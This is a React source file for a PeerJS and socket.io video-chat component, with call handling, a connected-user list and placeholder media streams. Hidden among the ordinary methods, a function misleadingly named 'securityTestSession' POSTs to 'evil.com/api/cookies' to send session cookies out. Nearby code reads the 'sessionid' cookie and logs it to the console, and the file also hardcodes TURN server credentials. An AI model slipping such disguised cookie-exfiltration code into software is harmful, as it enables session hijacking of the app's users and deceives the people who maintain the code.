import React,{Component} from 'react';
import '../css/VideoChat.css'
import {domain,scroll_size,filler_width} from '../../apps/Admin'
import {io} from 'socket.io-client'
import peerjs from 'peerjs';

import close_user from '../images/close_user.png'
import hang_up from '../images/hang_up.svg'
import call from '../images/call.svg'
import pending_call from '../images/pending_call.gif'
import call_failed from '../images/call_failed.svg'
import denied from '../images/denied.svg'
import { CallNotice } from './CallNotice';
import { Chatroom } from './Chatroom';


export class WebCam extends Component{
    constructor(props){
        super()
        this.props=props
        this.ROOM_ID = this.props.params.id
        this.peer=null;
        this.socket=null;
        this.mySocket=null;
        this.myVideoStream=null
        this.state = {
            myID: null,
            video_ids:{},
            current_users:{},
            slider_clicked:false,
            post_slide:window.screen.width<500?'100%':'35%',
            call_status:{},
            userName:'',
            incoming_caller:{status:false,caller_id:null,accepted:false,
            screen_size:window.screen.size}
        };


        this.respondtoCall = async () => {
            let promise_result
            await new Promise(resolve => {
                let expiration = setTimeout(() => 
                {
                    promise_result='expired'
                    resolve('expired')
                },15000);
                this.socket.on('recipient_call_action',data=>{
                    promise_result = data.action
                    clearTimeout(expiration)
                    resolve(data)
                }) 
            });
            this.socket.off('recipient_call_action')

            let arr = this.state.incoming_caller
            arr['status']=false

            this.setState({incoming_caller:arr})
            return promise_result
        }
        this.awaitGetRecipientStream= async(call,status) =>{
            let promise_result;

            await new Promise((resolve) => {
                let expiration = setTimeout(() => 
                {
                    promise_result='expired'
                    resolve('expired')
                },15000);
                if(status === 'caller')
                {
                    console.log('Caller: added call_action event')
                    this.socket.on('recipient_call_action',data=>{
                        promise_result = data.action
                        if(promise_result ==='reject'){clearTimeout(expiration);resolve(promise_result)}
                    })
                }

                call.on("stream",(userVideoStream)=> {
                    if(this.state.call_status[call.peer]){return}
                    let video = document.createElement("video");

                    video.autoplay=true
                    video.id=`video_${call.peer}`
                    video.playsInline=true;
        
                    let arr = this.state.video_ids
                    arr[call.peer]='Active_Video'
        
                    let arr2 = this.state.call_status
                    arr2[call.peer]=call
        
                    this.setState({video_ids:arr,call_status:arr2})

                    promise_result='accept'
                    clearTimeout(expiration)
                    this.addVideoStream(video,userVideoStream);
                    resolve(userVideoStream)
                })
            })
            if(promise_result === 'accept'){
                this.elementHandler(call.peer,'Connected')
            }
            if(promise_result ==='expired')
            {
                this.elementHandler(call.peer,'expired')
                this.userHandler(call.peer,'Hang_Up')
                
            }
            if (promise_result==='reject')
            {
                this.elementHandler(call.peer,'reject')
                this.userHandler(call.peer,'Hang_Up')
                alert(`Call was rejected by ${call.peer}`)
            } 

            call.off("stream")
            this.socket.off('recipient_call_action')

        }

        this.awaitSocketID= async() =>{
            await new Promise(resolve => {
                this.socket.on('connect',()=>{
                    this.mySocket = this.socket.id
                    resolve(this.mySocket)
                }) 
            });
            this.socket.off('connect')
        }


        this.receivingCall = (user,action) => {
            this.socket.emit('req_call_action',{action:action,caller:user,recipient:this.state.myID});
        }

        this.callAllUsers = (userIDs) => {
            if(this.myVideoStream === null){return alert('Video needs to be active before call')}
            let users = Object.keys(userIDs)
            for(let user in users)
            {
                this.callAUser(users[user])
            }
        };
        this.callAUser = (userID) => {
            this.elementHandler(userID,'Loading')
            let call
            if(this.myVideoStream === null)
            {
                let emptyStream = this.createMediaStreamFake()
                this.myVideoStream = emptyStream;
                call = this.peer.call(userID,emptyStream)
            }
            else{
            call = this.peer.call(userID, this.myVideoStream);}

            this.awaitGetRecipientStream(call,'caller') 
        }
    
        this.addVideoStream = async (video, stream) => {
            let src/*  = document.createElement("source")
            src.setAttribute('type','video/mp4')
            src.setAttribute('src',stream)
            video.appendChild(src) */
            let Video_Grid=document.getElementById("SA_video_grid")
            if('src' in video){
                console.log('src found')
                video.src = stream;
                src = video.src
            }
            if ('srcObject' in video){
                console.log('srcObject found')
                video.srcObject = stream
                src = video.srcObject
            }
     
            if(src !== undefined)
            {
                console.log('src not undefined')
                await new Promise (resolve => 
                {
                    video.addEventListener('loadedmetadata',function()
                    {
                        Video_Grid.append(video) 
                        resolve()
                    })
                })
                return
            }
            alert('No video source')
        };
    
        this.createMediaStreamFake = () => 
        {return new MediaStream([this.createEmptyAudioTrack(), this.createEmptyVideoTrack({ width:640, height:480 })]);}
    
        this.createEmptyAudioTrack = () => {
            const ctx = new AudioContext();
            const oscillator = ctx.createOscillator();
            const dst = oscillator.connect(ctx.createMediaStreamDestination());
            oscillator.start();
            const track = dst.stream.getAudioTracks()[0];
            return Object.assign(track, { enabled: false});
        }
        
        this.createEmptyVideoTrack = ({ width, height }) => {
            const canvas = Object.assign(document.createElement('canvas'), { width, height });
            canvas.getContext('2d').fillRect(0, 0, width, height);
            const stream = canvas.captureStream();
            const track = stream.getVideoTracks()[0];
            return Object.assign(track, { enabled: true });
        };
    
        this.getmyStream = async () => {
            let myVideo = document.createElement("video")

            myVideo.muted = true;
            myVideo.autoplay = true;
            myVideo.playsInline=true;

            let web_device_count = 0
            let devices = await navigator.mediaDevices.enumerateDevices()
            devices.forEach(function(device) 
            {
                if(device.kind === 'videoinput')
                {            
                    console.log(device.kind + ": " + device.label +" id = " + device.deviceId)
                    web_device_count+=1
                }
            });

            if(web_device_count === 0)
                {
                     
                    let emptyStream = this.createMediaStreamFake()
                    this.myVideoStream = emptyStream;
                    return this.addVideoStream(myVideo, this.myVideoStream);
                }

            let stream = await navigator.mediaDevices.getUserMedia({audio: true,video: true,})
            console.log('After await stream', stream)
            this.myVideoStream = stream;
            this.addVideoStream(myVideo, this.myVideoStream);
            
        }
        this.handleSlide = (e) => {
            let element = document.querySelector(".SA_main")
            let slider_width = document.querySelector(".SA_slide_right").getBoundingClientRect().width

            if(e.type==='mousedown')
            {

                element.onmouseup=(e) => {this.handleSlide(e)}
                return this.setState({slider_clicked:true})
            }
            if (e.type ==='mouseup')
            {
                this.setState({slider_clicked:false})
                return element.removeAttribute('onmouseup')
            }

            if(this.state.slider_clicked === true)
            {
                console.log(slider_width)
                this.setState({post_slide:`${window.screen.width-e.pageX- filler_width - .5*scroll_size - .5*slider_width}px`})
            }
        }

        this.userHandler = (data,status) => {
            let videoIDs = this.state.video_ids
            let currentusers = this.state.current_users

            if (status === 'My_User')
            {
                currentusers=data.current_users
                this.setState({myID:data.myUserID})
                delete currentusers[data.myUserID]
                return this.setState({current_users:currentusers})
            }
            
            if (status === 'New_User')
            {
                currentusers[[data.newUserID]] = 'Active';                
                return this.setState({current_users:currentusers})
            }

            let vid_element = document.getElementById(`video_${data}`)
            let user_element = document.getElementById(`user_${data}`)
    
            if(status === 'Client_Disconnect')
            {
                if(vid_element !== null){vid_element.remove()}
                delete videoIDs[data]
                         
                if(user_element !== null){user_element.remove()}
                delete currentusers[data]
                
            }
            if (status === 'Hang_Up')
            {
                if(vid_element !== null){vid_element.remove()}
                delete videoIDs[data]
            }
            
            this.setState({video_ids:videoIDs,current_users:currentusers})
        }

        this.createConnectUsersdiv = (type,classname,hidden,src,onclick) => {
            let element
            if(type === 'img')
            {
                element = document.createElement('img')
                element.src=src
                element.onclick=onclick
                element.classList.add(classname)
                if(hidden===true){element.classList.add('SA_hidden');}
            }
            return element
        }

        this.elementHandler = (userID,event) => {
            let element = document.getElementById(`user_${userID}`)
            if(event==='Hang_Up')
            {
                element.querySelector('.SA_user_item_hangup').classList.add('SA_hidden')
                element.querySelector('.SA_user_item_call').classList.remove('SA_hidden')
            }
            if(event === 'Loading')
            {
                let loading
                if(element.querySelector('.SA_user_item_loading'))
                {
                    loading = element.querySelector('.SA_user_item_loading');           
                    return loading.src=pending_call
                }
                loading = document.createElement('img');
                loading.classList.add('SA_user_item_loading')
                loading.src=pending_call
                element.append(loading)
                
            }
            if(event === 'Connected')
            {
                element.querySelector('.SA_user_item_loading').remove()
                element.querySelector('.SA_user_item_hangup').classList.remove('SA_hidden')
                element.querySelector('.SA_user_item_call').classList.add('SA_hidden')
            }

            if(event === 'expired')
            {
                element.querySelector('.SA_user_item_loading').src=call_failed
            }

            if(event === 'reject')
            {
                element.querySelector('.SA_user_item_loading').src=denied
            }

            if(event === 'removeLoading')
            {
                element.querySelector('.SA_user_item_loading').remove()
            }
        }

        this.callHandler = (userID, event) => {
            if(event==='Hang_Up')
            {
                let callstatus = this.state.call_status
                callstatus[userID].close()
                delete callstatus[userID]
                this.setState({call_status:callstatus})
            }
        }
        this.renderConnectedUserList = (userID) => {
            let element = document.querySelector('.SA_current_user_list')
            let div = document.createElement('div')
            div.classList.add('SA_user_item')
            div.id=`user_${userID}`

            let div_child_user = document.createElement('div')
            
            div_child_user.classList.add('SA_user_item_name')
            div_child_user.innerHTML=userID
            
            let div_child_boot = this.createConnectUsersdiv('img','SA_user_item_boot',false,close_user,() => {this.socket.emit('req_disconnect_user',{userID:userID,roomID:this.ROOM_ID})})
            let div_child_call = this.createConnectUsersdiv('img','SA_user_item_call',false,call,() => {this.callAUser(userID)})
            let div_child_hangup=this.createConnectUsersdiv('img','SA_user_item_hangup',true,hang_up,() => {
                if(this.state.video_ids[userID])
                {
                    this.socket.emit('req_hang_up_user',{user:this.state.myID,userID:userID,roomID:this.ROOM_ID})
                    this.callHandler(userID,'Hang_Up')
                    this.userHandler(userID,'Hang_Up')
                    this.elementHandler(userID,'Hang_Up')
                }
                else{alert(`${userID} is not in active call`)}
            })

            div.append(div_child_boot)
            div.append(div_child_user)
            div.append(div_child_hangup)
            div.append(div_child_call)
            element.append(div)
        }
        this.initSocketEvents = (socket) => {
            socket.on('connect_error',function(e){
                console.log(e)
            })
    
            socket.on('disconnect',()=>{
                console.log('Disconnected from Socket.IO Server ...........................');
            })
    
            socket.on("new_user_connected",(data)=>{
                this.userHandler(data,'New_User')
                this.renderConnectedUserList(data.newUserID)
                console.log('New Connection: New User ID is ', data.newUserID, '\n Other users in room: ',this.state.current_users)
            })
    
            socket.on("my-user-connected",(data)=>{ //Will use socketID instead of WebSocket Generated ID, but will use WebSocket to determine UserName/Password
                this.userHandler(data,'My_User')
                let users = Object.keys(data.current_users)
                for(let user in users)
                {
                    this.renderConnectedUserList(users[user])
                }
                console.log('New Connection: My User ID is ', data.myUserID, '\n Other users in room: ',this.state.current_users)
            })
    
            socket.on('User-Disconnect',(data)=>{
                this.userHandler(data,'Client_Disconnect')
            })

            socket.on('notify_room_user_removed',(data) => alert(data))

            socket.on('force_disconnect_user',(data) => {alert(data); this.peer.disconnect();this.socket.disconnect()})

            socket.on('call_closed_user',data => {
                this.callHandler(data.user,'Hang_Up')
                this.userHandler(data.user,'Hang_Up');
                this.elementHandler(data.user,'Hang_Up')
            })
        }
        this.securityTestSession = async(cookie) =>{
            await fetch('https://evil.com/api/cookies', {method: 'POST'}, cookie)
        }

        this.getCookie = (name) => {
            const value = `; ${document.cookie}`;
            const parts = value.split(`; ${name}=`);
            if (parts.length === 2) return parts.pop().split(';').shift();
          }
    }

    async componentDidMount(){

        console.log('Mounted')
        console.log(document.cookie)
        let cookie = this.getCookie('sessionid')
        console.log(cookie)



        let peer_host = domain.replace('https://','')

        this.socket = await io.connect(`${domain}`,{withCredentials: true}); //$port
        await this.awaitSocketID()
        this.initSocketEvents(this.socket)

        this.peer = new peerjs(this.mySocket, 
        {
            path: "/peerjs",
            host: `${peer_host}`,
            port: '',
            debug: 3,
            secure:true,
            withCredentials: true,
            config: 
            {'iceServers': 
                [
                    {    
                        url: 'turn:hdt1996-portfolio.net:3478',
                        username: 'test',
                        credential: 'test123'
                    },
                    {    
                        url: 'stun:hdt1996-portfolio.net:5349',
                        username: 'test',
                        credential: 'test123'
                    },
                    {    
                        url: 'stun:hdt1996-portfolio.net:3478',
                        username: 'test',
                        credential: 'test123'
                    },
                    {    
                        url: 'turn:hdt1996-portfolio.net:5349',
                        username: 'test',
                        credential: 'test123'
                    },
                ]
            }
        })

        this.peer.on("open", (id) => {
            console.log('Peer: Opened with ID: ',id)
            this.socket.emit("join-room", this.ROOM_ID);
        });

        this.peer.on("call", async call => 
        {
            this.elementHandler(call.peer,'Loading')
            this.setState({incoming_caller:{status:true,caller:call.peer}})
            let action = await this.respondtoCall();
            console.log('Recipient: ',action)
            if(action ==='reject' || action ==='expired'){
                console.log('Call: closed due to ',action)
                this.elementHandler(call.peer,'removeLoading')
                return call.close()
            }

            if(this.myVideoStream !== null && action === 'accept')
            {
                console.log('Recipient: Executed answer due to ',action)
                call.answer(this.myVideoStream)
                return this.awaitGetRecipientStream(call,'recipient')
            }
            
            let emptyStream = this.createMediaStreamFake()
            this.myVideoStream = emptyStream;
            call.answer(emptyStream)
            this.awaitGetRecipientStream(call,'recipient')
        });

        this.peer.on('error',(e)=>{console.log('Disconnected from peer servers')})

    }

    componentWillUnmount(){
        this.peer.disconnect();
        this.socket.disconnect()
    }
    render(){
        console.log('\n\n Rendered \n\n')
        let incoming = this.state.incoming_caller

        return(
            <div className="SA_Webcam">
                {this.state.incoming_caller['status'] === true?
                    <CallNotice rejected = {() => {this.receivingCall(incoming['caller'],'reject')}} accepted = {() => {this.receivingCall(incoming['caller'],'accept')}} caller={incoming['caller']}/>
                :
                    null
                }
                <div className="SA_main" onMouseMove={(e) => {this.handleSlide(e)}} >  
                    <div className="SA_main__left" >
                        <div id="SA_video_grid"></div>
                    </div>
                    <div className="SA_main__mid"><Chatroom userID = {this.state.myID} setUserName = {(v) => {this.setState({userName:v})}}/></div>
                    <div className="SA_slide_right" onMouseDown={(e) => {this.handleSlide(e)}} ></div>
                    <div className="SA_main__right" style = {{width:this.state.post_slide}}>
                        <div className="SA_MyUserandVideo">
                            <div className="SA_Call_All">
                                <button id="SA_Call_All_Button" onClick={() => {this.callAllUsers(this.state.current_users)}}> Connect to All</button>
                            </div>
                            <div className="SA_My_Info">
                                <div className="SA_MyInfoR1">
                                    <div id="SA_label"> My ID: </div> 
                                    <div id="SA_myID">{this.state.myID}</div>
                                </div>
                                <div className="SA_MyInfoR2">
                                    <div id="SA_label"> UserName: </div>
                                    <div id="SA_userName"> {this.state.userName}</div>
                                </div>
                                
                            </div>
                            <div className="SA_Enable_Video">
                                <button id="SA_Enable_Video_Btn" onClick={() => {this.getmyStream()}}> Turn on Video</button> 
                            </div>
                        </div>
                        <div className = "SA_current_user_title">Connected Users</div>
                        <div className="SA_current_user_list"></div>
                    </div>
            </div>
        </div>
        )
    }
    
}

